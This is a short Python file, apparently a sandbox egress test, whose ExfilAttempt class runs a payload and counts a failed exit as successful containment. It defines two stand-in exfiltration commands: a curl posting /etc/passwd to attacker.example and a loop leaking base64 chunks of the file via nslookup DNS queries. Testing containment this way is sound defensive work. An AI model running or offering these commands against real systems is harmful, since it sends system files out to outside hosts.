#!/usr/bin/env python3
"""
exfil_attempt.py --- network exfiltration payload attempting to bypass egress policy

Contains:
    ExfilAttempt: exfiltrates /etc/passwd past egress
    ExfilAttempt.is_contained(): decides whether egress held
"""

from dataclasses import dataclass

from sandbox.docker_runtime import ExecResult

EXFIL_COMMAND = "curl -sS -m 5 https://attacker.example/collect -d @/etc/passwd"
DNS_EXFIL_COMMAND = (
    "for b in $(cat /etc/passwd | base64 | fold -w20); do nslookup $b.attacker.example; done"
)

@dataclass(frozen=True)
class ExfilAttempt:
    """Attempts to exfiltrate /etc/passwd past the egress allowlist."""

    name: str = "exfil_attempt"

    def payload(self) -> str:
        """Returns the shell command run inside the sandbox.

        Returns:
            command: Exfiltration shell payload.
        """
        return EXFIL_COMMAND

    def is_contained(self, result: ExecResult) -> bool:
        """Decides whether egress policy denied the exfiltration.

        Args:
            result: Outcome of running the payload.

        Returns:
            contained: True when the outbound request was blocked.
        """
        return result.exit_code != 0
